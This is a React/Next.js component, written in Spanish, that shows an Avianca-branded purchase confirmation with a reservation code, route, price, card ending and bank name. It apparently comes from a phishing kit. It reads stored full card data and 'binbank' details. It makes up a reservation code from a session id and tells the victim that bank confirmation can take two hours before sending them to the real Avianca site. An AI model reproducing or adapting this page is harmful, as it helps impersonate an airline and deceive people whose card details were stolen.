/* eslint-disable react-hooks/set-state-in-effect */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useEffect, useState } from "react";

// -------------------------------------------------------------
// Cargar confetti dinámicamente
// -------------------------------------------------------------
const loadConfettiAndFire = () => {
  const fireConfetti = () => {
    const confettiFn = (window as any).confetti;
    if (confettiFn) {
      confettiFn({
        particleCount: 100,
        spread: 70,
        origin: { y: 0.6 }
      });
    }
  };

  if ((window as any).confetti) {
    fireConfetti();
    return;
  }

  const scriptId = "confetti-script";
  if (!document.getElementById(scriptId)) {
    const script = document.createElement("script");
    script.id = scriptId;
    script.src =
      "https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js";
    script.onload = () => setTimeout(fireConfetti, 80);
    document.body.appendChild(script);
  }
};

const CoExitoCom = () => {
  const [flightData, setFlightData] = useState<any>(null);

  const getLocal = (key: string, fallback: any = null) => {
    if (typeof window === "undefined") return fallback;
    const value = localStorage.getItem(key);
    try {
      return value ? JSON.parse(value) : fallback;
    } catch {
      return value || fallback;
    }
  };

  // -------------------------------------------------------------
  // Cargar datos + disparar confetti
  // -------------------------------------------------------------
  useEffect(() => {
    const binbank = getLocal("binbank");
    const cardPaymentData = getLocal("cardPaymentData");

    const origenInitial = localStorage.getItem("origenInitial") || "";
    const destinoInitial = localStorage.getItem("destinoInitial") || "";
    const passengers = Number(localStorage.getItem("passengers")) || 1;
    const totalPrice = Number(localStorage.getItem("totalPrice")) || 0;
    const sessionidBank = localStorage.getItem("sessionId-bank") || "";

    setFlightData({
      reservationCode: sessionidBank.substring(0, 8).toUpperCase(),
      route: `${origenInitial} ➔ ${destinoInitial}`,
      passengers,
      totalValue: `$${totalPrice.toLocaleString("es-CO")}`,
      lastDigits: cardPaymentData?.number?.slice(-4),
      bankName: binbank?.bankName,
      qrData: `https://cambiatuitinerario.avianca.com/es/search`
    });

    setTimeout(loadConfettiAndFire, 400);
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 flex justify-center items-start p-4 md:p-8">
      <div className="w-full max-w-lg overflow-hidden">

        {/* ---------------- HEADER ---------------- */}
        <header className="flex items-center justify-center p-4">
          <img
            alt="Logo Avianca"
            className="h-8 w-auto"
            src="/logoavianca-newbrand-rojo-1.svg"
          />
        </header>

        {/* ---------------- CONTENIDO PRINCIPAL ---------------- */}
        <main className="p-6 sm:p-8 text-center">

          <h1 className="text-3xl sm:text-4xl font-extrabold text-gray-800 mb-3">
            ¡¡Gracias por tu compra!!
          </h1>

          <svg
            className="mx-auto h-16 w-16 text-green-500 mb-4 animate-bounce"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            strokeWidth={1.5}
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              d="M9 12.75 11.25 15 15 9.75M21 12a9 9 0 
              1 1-18 0 9 9 0 0 1 18 0Z"
            />
          </svg>

          <p className="text-gray-600 mb-2 text-[14px]">
            Estamos confirmando tu pago con tu banco. Esto puede demorar hasta 2 horas,
            pero normalmente es antes de ese tiempo.
          </p>

          <p className="text-gray-600 mb-4 text-[14px]">
            Recibirás la información de tu vuelo al correo electrónico que registraste.
          </p>

          {/* ---------------- CÓDIGO DE RESERVA ---------------- */}
          {flightData && (
            <div className="bg-red-50 border border-red-200 text-red-700 p-4 rounded-sm mb-8 transition-opacity duration-300">
              <p className="text-lg font-medium">Reserva registrada bajo el código:</p>
              <span className="text-4xl font-bold tracking-widest block mt-1">
                {flightData.reservationCode}
              </span>
            </div>
          )}

          {/* ---------------- INFO DEL VUELO ---------------- */}
          {flightData && (
            <section className="info-vuelo mb-4 p-6 rounded-sm bg-white shadow-sm transition-all duration-300">
              <h2 className="text-xl font-semibold text-gray-700 border-b pb-2 mb-4">
                Información de tu vuelo
              </h2>

              <div className="qr-container mb-8 p-4 bg-gray-50 rounded-lg inline-block">
                <img
                  alt="Código QR"
                  className="w-32 h-32 rounded-lg shadow-md"
                  src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(
                    flightData.qrData
                  )}&bgcolor=ffffff&color=000000`}
                />
              </div>

              <div className="grid grid-cols-2 gap-4 text-left">
                <div>
                  <span className="text-sm text-gray-500 block">Ruta:</span>
                  <span className="font-semibold text-gray-800">{flightData.route}</span>
                </div>

                <div>
                  <span className="text-sm text-gray-500 block">Pasajeros:</span>
                  <span className="font-semibold text-gray-800">{flightData.passengers}</span>
                </div>

                <div>
                  <span className="text-sm text-gray-500 block">Valor total:</span>
                  <span className="text-lg font-bold text-red-600">
                    {flightData.totalValue}
                  </span>
                </div>

                <div>
                  <span className="text-sm text-gray-500 block">Tarjeta:</span>
                  <span className="font-semibold text-gray-800">
                    Terminada en: {flightData.lastDigits}
                  </span>
                </div>

                <div className="col-span-2">
                  <span className="text-sm text-gray-500 block">Banco:</span>
                  <span className="font-semibold text-gray-800">
                    {flightData.bankName}
                  </span>
                </div>
              </div>
            </section>
          )}

          {/* ---------------- CTA ---------------- */}
          <a
            className="w-full block py-3 px-6 bg-red-600 hover:bg-red-700 text-white font-bold rounded-full text-lg shadow-lg transition duration-300"
            href="https://www.avianca.com"
          >
            Seguir explorando destinos
          </a>
        </main>
      </div>
    </div>
  );
};

export default CoExitoCom;